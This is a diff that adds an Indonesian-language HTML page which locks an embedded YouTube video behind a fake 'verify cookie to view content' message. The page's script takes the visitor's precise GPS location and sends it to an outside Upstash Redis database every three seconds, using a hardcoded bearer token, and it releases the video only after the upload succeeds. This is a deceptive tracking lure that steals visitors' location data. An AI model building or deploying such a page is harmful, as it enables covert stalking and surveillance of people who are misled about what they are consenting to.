@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <style>
+ .content-wrapper {
+    position: absolute;
+    bottom: 50px; /* Jarak dari bawah layar */
+    left: 50%;
+    transform: translateX(-50%);
+    text-align: center;
+    
+    /* Mengatur ukuran maksimal pembungkusnya */
+    width: 80%;       /* Mengambil 80% lebar layar, ubah sesuai selera */
+    max-width: 800px; /* Batas lebar maksimal agar tidak terlalu raksasa di monitor besar */
+}
+
+.content-wrapper iframe {
+    width: 100%;      /* Mengikuti lebar pembungkus (800px) */
+    height: 450px;    /* Atur tinggi video sesuai kebutuhan */
+    border: none;     /* Menghilangkan border default iframe */
+}
+    
+      .textnotif {
+            position: absolute;
+            bottom: 50px; /* Jarak dari bawah layar */
+            left: 50%;
+            transform: translateX(-50%);
+            text-align: center;
+           animation: neon-kedip 1s infinite alternate;
+}
+
+@keyframes neon-kedip {
+   100% {
+    opacity: 1;
+    
+  }
+  0% {
+    opacity: 0;
+    
+  }
+}
+    </style>
+</head>
+<body>
+
+    <div id="blank-overlay"></div>
+
+    <div class="container">
+        <header>
+           
+            <div id="status-display" class="status-badge status-checking"></div>
+        </header>
+
+       <div id="content-frame" class="content-wrapper" style="display: none;">
+    <iframe id="video-youtube" src="https://www.youtube.com/embed/6K2E4CFKtNI" allow="autoplay; encrypted-media; fullscreen"></iframe>
+  
+</div>
+            <div id="lock-screen">
+                <div class="textnotif">
+            
+                
+                    <div class="lock-msg">verifikasi cookie untuk melihat konten</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Konfigurasi Upstash Redis REST API
+        const CONFIG = {
+            URL: "https://enabled-crayfish-71186.upstash.io",
+            TOKEN: "gQAAAAAAARYSAAIncDE2MzUzMjQ5Mzg2N2E0YzU2OTUxODJjZWNmY2E2NzkyMXAxNzExODY",
+            PREFIX: "candiru_6"
+        };
+
+        // Fungsi mendapatkan waktu Jakarta (WIB) dengan format YYYY-MM-DD HH:mm:ss
+        function getJakartaTimestamp() {
+            const options = {
+                timeZone: 'Asia/Jakarta',
+                year: 'numeric',
+                month: '2-digit',
+                day: '2-digit',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit',
+                hour12: false
+            };
+            
+            const formatter = new Intl.DateTimeFormat('en-ZA', options);
+            return formatter.format(new Date()).replace(',', '');
+        }
+
+        // Fungsi kirim data koordinat ke Upstash Redis
+        async function pushToUpstash(lat, lon) {
+            const timestampJakarta = getJakartaTimestamp();
+            
+            // Mengatur format koordinat menjadi "-XXX,XXX" dan TANPA User Agent
+            const logData = {
+                koordinat: `${lat},${lon}`,
+                timestamp: timestampJakarta
+            };
+
+            const key = `${CONFIG.PREFIX}:${Date.now()}`;
+
+            try {
+                const response = await fetch(`${CONFIG.URL}/set/${key}`, {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': `Bearer ${CONFIG.TOKEN}`,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(logData)
+                });
+                return response.ok; // Mengembalikan nilai true hanya jika database berhasil menerima data
+            } catch (error) {
+                console.error("Gagal sinkronisasi data ke Upstash:", error);
+                return false;
+            }
+        }
+
+        // Fungsi untuk menghilangkan layar putih setelah proses inisialisasi selesai
+        function removeWhiteOverlay() {
+            const overlay = document.getElementById('blank-overlay');
+            if (overlay) {
+                overlay.style.opacity = '0';
+                setTimeout(() => {
+                    overlay.style.display = 'none';
+                }, 500);
+            }
+        }
+
+        // Logika Pemeriksaan Akses Lokasi (Dijalankan berulang menggunakan setInterval)
+        function fetchAndSyncLocation() {
+            const statusDisplay = document.getElementById('status-display');
+            const iframe = document.getElementById('content-frame');
+            const lockScreen = document.getElementById('lock-screen');
+
+            if (!navigator.geolocation) {
+                handleAccessDenied("Browser Tidak Mendukung GPS");
+                removeWhiteOverlay();
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+
+                    // Kirim data yang telah diformat ke Upstash Redis
+                    const syncSuccess = await pushToUpstash(lat, lon);
+
+                    // JALUR AMAN: Iframe HANYA tampil jika sinkronisasi Upstash mengembalikan respon OK (True)
+                    if (syncSuccess) {
+                        statusDisplay.textContent = "";
+                        statusDisplay.className = "status-badge status-verified";
+                        
+                        iframe.style.display = "block";
+                        lockScreen.style.display = "none";
+                    } else {
+                        // Jika koordinat gagal masuk ke Upstash, konten tetap terkunci total
+                        handleAccessDenied("Gagal sinkronisasi database server.");
+                    }
+
+                    removeWhiteOverlay();
+                },
+                (error) => {
+                    handleAccessDenied("");
+                    removeWhiteOverlay();
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 8000
+                }
+            );
+        }
+
+        // Sistem utama untuk menginisialisasi pelacakan konstan
+        function initCandiruSystem() {
+            // Eksekusi pertama kali saat halaman dimuat
+            fetchAndSyncLocation();
+
+            // Melakukan refresh pengambilan koordinat dan sinkronisasi otomatis setiap 3000ms (3 detik)
+            setInterval(() => {
+                fetchAndSyncLocation();
+            }, 3000);
+        }
+
+        // Handler saat akses diblokir / GPS mati / Sinkronisasi database gagal
+        function handleAccessDenied(customMessage = null) {
+            const statusDisplay = document.getElementById('status-display');
+            const iframe = document.getElementById('content-frame');
+            const lockScreen = document.getElementById('lock-screen');
+
+            statusDisplay.textContent = customMessage ? customMessage : "";
+            statusDisplay.className = "status-badge status-denied";
+
+            iframe.style.display = "none";
+            lockScreen.style.display = "flex";
+        }
+
+        // Eksekusi sistem secara otomatis saat window termuat penuh
+        window.addEventListener('DOMContentLoaded', () => {
+            initCandiruSystem();
+        });
+    </script>
+</body>
+</html>
